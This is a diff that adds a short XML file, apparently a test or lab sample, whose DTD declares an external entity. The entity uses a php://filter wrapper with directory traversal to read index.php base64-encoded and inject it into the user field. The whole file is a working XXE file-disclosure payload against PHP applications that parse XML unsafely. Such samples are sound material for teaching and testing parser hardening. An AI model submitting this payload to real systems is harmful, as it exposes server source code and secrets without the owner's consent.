@@ -1,0 +1,16 @@
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+  <!ELEMENT root (user, password,email)>
+<!ELEMENT user (#PCDATA)>
+<!ELEMENT password (#PCDATA)>
+<!ELEMENT email (#PCDATA)>
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../index.php">
+<!ENTITY e "???">
+]>
+<root>
+  <!--external entity-->
+  <user>&xxe;</user>
+  <password>mypass&quot;</password>
+  <!--enternal entity-->
+  <email>&e;</email>
+</root>
